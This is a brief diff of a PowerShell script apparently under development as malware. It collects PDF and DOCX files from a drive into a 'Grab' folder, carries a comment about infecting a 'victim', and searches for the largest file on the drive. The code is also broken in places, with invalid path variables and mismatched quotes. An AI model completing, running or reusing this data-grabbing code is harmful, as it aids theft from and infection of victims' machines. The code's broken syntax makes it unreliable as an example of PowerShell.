@@ -1,6 +1,6 @@
 $output = "%User%\Desktop\Grab"
 $input = "D:\*.pdf,*.docx"
-$inputv = "%User%\Desktop\V\Test.bat"
+$inputv = "%User%\Desktop\V\Test.ps1"
 Copy-Item -path $input -destination $output
 #Invect victim
 $sise = "(gci -path "D:\" -r | sort Length -desc | select fullname -f 1)"
